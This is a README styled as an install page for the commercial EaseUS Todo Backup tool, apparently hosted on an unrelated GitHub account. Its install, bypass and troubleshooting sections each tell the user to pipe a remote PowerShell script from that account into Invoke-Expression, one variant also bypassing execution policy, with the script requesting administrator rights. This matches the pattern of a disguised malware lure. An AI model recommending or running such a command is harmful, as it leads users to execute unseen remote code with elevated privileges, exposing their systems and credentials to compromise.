# EaseUS Todo Backup Setup
the reliable system backup and recovery solution with smart scheduling, one-click system clone to SSD, cloud storage integration, and bare-metal restore capability.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for disk-level backup read access.
- Downloads EaseUS Todo Backup installer and runs setup silently.
- Creates an initial full system image backup to the selected destination drive.
- Configures incremental daily scheduled backups automatically after first full backup.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- ~300 MB free disk space

## Troubleshooting

**Backup job fails with insufficient disk space error**

Enable High compression in backup settings or choose a destination drive with more available free space.

**System clone operation stalls at 99% and never finishes**

Decrypt BitLocker on the source drive before cloning and re-enable encryption on the new drive afterward.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.